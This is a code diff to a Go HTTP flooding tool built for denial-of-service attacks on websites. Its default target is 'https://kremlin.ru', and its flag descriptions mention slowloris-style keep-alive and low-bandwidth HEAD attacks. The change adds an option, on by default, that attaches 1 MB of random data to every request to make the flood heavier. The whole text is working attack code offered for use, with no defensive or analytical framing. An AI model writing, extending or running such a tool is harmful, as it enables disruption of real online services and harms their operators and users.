@@ -2,14 +2,16 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"crypto/rand"
 	"flag"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"sync"
 	"time"
-	"log"
 )
 
 type Site struct {
@@ -27,6 +29,8 @@ var (
 	delay             time.Duration
 	maxWorkersPerSite int
 	HTTPMethod        *string
+	sendPayload       *bool
+	payloadLength     *int
 )
 
 func init() {
@@ -35,7 +39,9 @@ func init() {
 	sitesFile := flag.String("sites-file", "./sites.txt", "Path to file with URLs, each on a new line")
 	site := flag.String("site", "https://kremlin.ru", "Site URL to attack")
 	delayFlag := flag.Int("delay", 0, "Sleep time in milliseconds between each request per worker. Can be increased for keep-alive attacks similar to slowloris")
-	HTTPMethod = flag.String("method", "GET", "HTTP method to use. Use HEAD for low bandwidth attacks. POST payloads are not implemented now")
+	HTTPMethod = flag.String("method", "GET", "HTTP method to use. Use HEAD for low bandwidth attacks")
+	sendPayload = flag.Bool("send-payload", true, "Attach payload with random content to each request")
+	payloadLength = flag.Int("payload-length", 1024, "Payload length in kilobytes")
 	flag.Parse()
 
 	delay = time.Duration(*delayFlag) * time.Millisecond
@@ -79,7 +85,14 @@ func loadSitesFromFile(filename string) ([]*Site, error) {
 }
 
 func newRequest(url string) (*http.Request, error) {
-	r, err := http.NewRequest(*HTTPMethod, url, nil)
+	var payload io.Reader
+	if *sendPayload == true {
+		b := make([]byte, (*payloadLength)*1024)
+		rand.Read(b)
+		payload = bytes.NewBuffer(b)
+	}
+
+	r, err := http.NewRequest(*HTTPMethod, url, payload)
 	if err != nil {
 		return nil, err
 	}
